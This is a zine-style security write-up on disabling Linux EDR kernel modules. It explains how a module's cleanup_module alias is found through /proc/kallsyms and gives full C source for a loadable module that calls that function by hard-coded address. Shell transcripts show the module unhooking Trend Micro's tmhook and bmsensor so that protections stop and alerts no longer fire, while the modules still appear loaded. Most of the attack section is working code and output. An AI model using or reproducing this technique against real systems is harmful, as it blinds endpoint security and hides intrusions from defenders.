root@malware:~# insmod unhook.ko
root@malware:~# dmesg
[ 1337.001337]
[ 1337.001337]  
[ 1337.001337]  Unhooking Linux EDRs
[ 1337.001337]     
[ 1337.001337]
root@malware:~#

--[ Summary ]-----------------------------------------------------------------

1 - Introduction
2 - Understanding how Kernel Module is removed
3 - Unhooking EDR
4 - Conclusion

--[ 1 ]--------------------------------------------[ Introduction ]-----

Linux security has always been a subject of great interest to me, especially
when it comes to detecting and mitigating threats at the kernel level. 
I am constantly seeking to understand the mechanisms used for system 
monitoring and protection, and this time, I have deepened my research in 
EDRs (Endpoint Detection and Response) on Linux.

Currently, various EDR solutions uses LKMs (Loadable Kernel Modules) 
to system call hooking and implementing security mechanisms. For example, 
Trend Micro Deep Security utilizes kernel modules for monitoring and protection,
whereas CrowdStrike Falcon relies on eBPF (Extended Berkeley Packet Filter) 
and ML (Machine Learning).

What caught my attention the most were EDRs that utilize LKMs. In this zine, 
I will explore how we can manipulate these hooks removing hooks from a 
specific LKM to prevent alert generation and potentially disable its 
protection mechanisms.


--[ 2 ]--------------------------------------------[ Understanding how Kernel Module is removed ]-----

First, we need to understand how a kernel module is removed. To do this, 
let's look at a simple C code snippet that represents a Loadable Kernel Module (LKM):


╔═══════════════════════════════════════╗
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuz");
MODULE_DESCRIPTION("Example");

int matheuz_init(void) {
    printk(KERN_INFO "Hello, @matheuz!\n");
    return 0;
}

void matheuz_exit(void) {
    printk(KERN_INFO "Bye, @matheuz!\n");
}

module_init(matheuz_init);
module_exit(matheuz_exit);
╚═══════════════════════════════════════╝

When the module is loaded, the kernel call matheuz_init(), logging 
"Hello, @matheuz!" in the kernel log. Upon removal with rmmod, the kernel checks 
if the module is in use (refcount), calls matheuz_exit(), logs "Bye, @matheuz!", 
and removes the LKM, making it disappear from /proc/modules and /sys/module/.

Interestingly, the kernel creates an alias called cleanup_module, pointing 
to matheuz_exit(), which can be verified through /proc/kallsyms:


╔════════════════════════════════════════════════════════════════════════╗
 cowboy@bebop:~$ sudo insmod matheuz.ko
 cowboy@bebop:~$ dmesg
 [ 1894.726088] Hello, @matheuz!
 cowboy@bebop:~$ sudo cat /proc/kallsyms|grep matheuz | grep -e cleanup_mod
 ffffffffc113b010 d __UNIQUE_ID___addressable_cleanup_module467  [matheuz]
 ffffffffc1139040 t cleanup_module [matheuz]
 ffffffffc1139030 t __pfx_cleanup_module [matheuz]
 cowboy@bebop:~$
╚════════════════════════════════════════════════════════════════════════╝

You might be wondering: why does this matter? After all, only root users 
can remove modules using rmmod in specific, right? Wrong. Some security solutions, 
such as Trend Micro's EDR, implement protections that prevent their kernel module 
from being removed even with root:


╔════════════════════════════════════════════════════════════════════════╗
root@edr:~# lsmod|grep tmhook
tmhook                143360  110 bmsensor
root@edr:~# lsmod|grep bmsensor
bmsensor              557056  2
tmhook                143360  110 bmsensor
root@edr:~# 
root@edr:~# rmmod -f bmsensor
rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could not remove 'bmsensor': Resource temporarily unavailable
rmmod: ERROR: could not remove module bmsensor: Resource temporarily unavailable
root@edr:~# 
root@edr:~# rmmod -f tmhook
rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could not remove 'tmhook': Resource temporarily unavailable
rmmod: ERROR: could not remove module tmhook: Resource temporarily unavailable
root@edr:~# 
root@edr:~# 
╚════════════════════════════════════════════════════════════════════════╝

But what if, instead of using rmmod, we directly calls the module's 
cleanup_module function, bypassing these restrictions?

--[ 3 ]--------------------------------------------[ Unhooking EDR  ]-----

Since rmmod is not a viable option, we can bypass this limitation by directly calls
the module's cleanup_module function. But how is this possible? The answer 
is simple: by creating an LKM that have the function's address and calls it.

In other words, if we find cleanup_module through /proc/kallsyms and call it,
we can disable the module's hooks without actually removing it from memory.


╔════════════════════════════════════════════════════════════════════════╗
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>

struct module_entry {
    struct list_head list;
    char *name; 
    void *address;
};

static LIST_HEAD(module_list);

static void add_entry(char *name, void *address) {
    struct module_entry *mod;
    mod = kmalloc(sizeof(struct module_entry), GFP_KERNEL);
    if (!mod) {
        printk(KERN_ERR "Deu ruimkjkj.\n");
        return;
    }
    mod->name = name;
    mod->address = address;
    list_add_tail(&mod->list, &module_list);
}

static void magick_lol(void) {
    struct module_entry *entry;
    list_for_each_entry(entry, &module_list, list) {
        if (strcmp(entry->name, "cleanup_module") == 0) {

            ((void (*)(void))entry->address)();
            break;
        }
    }
}

static int __init lkm_init(void) {
    add_entry("cleanup_module", (void *)0xffffffffc093b990); //call
    magick_lol();

    return 0;
}

static void __exit lkm_exit(void) {
  printk(KERN_INFO "Qlq coisa kkjkjkjk\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuz");
MODULE_DESCRIPTION("Sem descrição kkjkjk");
MODULE_VERSION("1.0");

module_init(lkm_init);
module_exit(lkm_exit);
╚════════════════════════════════════════════════════════════════════════╝

In short, this simple code creates a linked list of structures where each entry
contains the name and address of a function specifically, cleanup_module
from the tmhook module.

It then adds an entry for cleanup_module with its corresponding address and
calls the function magick_lol(), which searches for this entry in the list. 
If found, it calls the associated function.

Once the LKM is loaded, you can check the kernel logs with dmesg to confirm
that the module has been successfully "removed." As a result, all protections
will be bypassed, alerts will stop triggering, and any hooked operations within
the kernel module will cease to function. This is because cleanup_module
is simply an alias for module_exit, meaning the module still appears in lsmod,
but its hooks are no longer active.


╔════════════════════════════════════════════════════════════════════════╗
root@edr:~# lsmod|grep tmhook
tmhook                143360  110 bmsensor
root@edr:~# 
root@edr:~# dmesg|grep tmhook
[   24.211040] tmhook: loading out-of-tree module taints kernel.
[   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
[   24.211048] tmhook: module verification failed: signature and/or required key missing - tainting kernel
[   24.318298] tmhook: tmhook_lookup_symbol(do_int80_syscall_32) failed: register_kprobe = -2
[   24.318438] tmhook: tmhook_lookup_symbol(ia32_sys_call_table) failed: register_kprobe = -2
[   24.388078] livepatch: enabling patch 'tmhook'
[   24.397248] livepatch: 'tmhook': starting patching transition
[   24.445418] tmhook: tmhook 1.2.2049 loaded
[   41.049805] livepatch: 'tmhook': patching complete
root@edr:~# 
root@edr:~# cat /proc/kallsyms|grep tmhook |grep -e cleanup_module
ffffffffc08cdd50 d __UNIQUE_ID___addressable_cleanup_module319  [tmhook]
ffffffffc08cb310 t cleanup_module [tmhook]
ffffffffc08cb300 t __pfx_cleanup_module [tmhook]
root@edr:~# 
root@edr:~# cat unhook.c|grep cleanup_mod
        if (strcmp(entry->name, "cleanup_module") == 0) {
    add_entry("cleanup_module", (void *)0xffffffffc08cb310); //call
root@edr:~# 
╚════════════════════════════════════════════════════════════════════════╝

Notice that the Trend Micro tmhook module is currently loaded. Now,
let's call its cleanup_module function.

╔════════════════════════════════════════════════════════════════════════╗
root@edr:~# insmod unhook.ko
root@edr:~# 
root@edr:~# dmesg|grep tmhook
[   24.211040] tmhook: loading out-of-tree module taints kernel.
[   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
[   24.211048] tmhook: module verification failed: signature and/or required key missing - tainting kernel
[   24.318298] tmhook: tmhook_lookup_symbol(do_int80_syscall_32) failed: register_kprobe = -2
[   24.318438] tmhook: tmhook_lookup_symbol(ia32_sys_call_table) failed: register_kprobe = -2
[   24.388078] livepatch: enabling patch 'tmhook'
[   24.397248] livepatch: 'tmhook': starting patching transition
[   24.445418] tmhook: tmhook 1.2.2049 loaded
[   41.049805] livepatch: 'tmhook': patching complete
[ 1040.077852] tmhook: tmhook 1.2.2049 unloaded
root@edr:~# 
root@edr:~# 
╚════════════════════════════════════════════════════════════════════════╝

After loading our LKM that calls cleanup_module, check the dmesg logs,
tmhook has been successfully unloaded. This confirms that the technique
worked perfectly! We can apply the same approach to bmsensor, Trend Micro's sensor module.


╔════════════════════════════════════════════════════════════════════════╗
root@edr:~# cat /proc/kallsyms|grep bmsensor|grep -e cleanup_module
ffffffffc0947ef0 d __UNIQUE_ID___addressable_cleanup_module502  [bmsensor]
ffffffffc093b990 t cleanup_module [bmsensor]
ffffffffc093b980 t __pfx_cleanup_module [bmsensor]
root@edr:~# 
root@edr:~# cat unhook.c |grep 990
    add_entry("cleanup_module", (void *)0xffffffffc093b990); //call
root@edr:~# 
root@edr:~# insmod unhook.ko
root@edr:~# 
╚════════════════════════════════════════════════════════════════════════╝

As a result, no alerts will be triggered, and none of Trend Micro's module
hooks will function, as we have effectively "removed" it, without actually using rmmod.


╔════════════════════════════════════════════════════════════════════════╗
 cowboy@bebop:~$ sudo insmod matheuz.ko
 cowboy@bebop:~$ dmesg
 [ 5415.087197] Hello, @matheuz!
 cowboy@bebop:~$
 cowboy@bebop:~$ sudo cat /proc/kallsyms|grep matheuz|grep -e cleanup_mod
 ffffffffc113b010 d __UNIQUE_ID___addressable_cleanup_module467  [matheuz]
 ffffffffc1139040 t cleanup_module [matheuz]
 ffffffffc1139030 t __pfx_cleanup_module [matheuz]
 cowboy@bebop:~$
 cowboy@bebop:~$ cat unhook.c |grep cleanup_mod
         if (strcmp(entry->name, "cleanup_module") == 0) {
     add_entry("cleanup_module", (void *)0xffffffffc1139040); //call
 cowboy@bebop:~$
 cowboy@bebop:~$ sudo insmod unhook.ko
 cowboy@bebop:~$
 cowboy@bebop:~$ dmesg
 [ 5415.087197] Hello, @matheuz!
 [ 5493.200914] Bye, @matheuz!
 cowboy@bebop:~$
╚════════════════════════════════════════════════════════════════════════╝

This technique can be applied to any module that implements cleanup_module,
whether it's an EDR, a rootkit, or any other LKM.

--[ 4 ]--------------------------------------------[ Conclusion ]-----

Kernel modules present multiple attack surfaces, and by manipulating cleanup_module,
we were able to disable hooks and suppress alerts without officially
removing the module. This demonstrates that the very design of Linux provides
alternative pathways for those who know where to look.

If you have any questions, please contact me:

Discord: kprobe
Twitter: @MatheuzSecurity
Rootkit Researchers: https://discord.gg/66N5ZQppU7
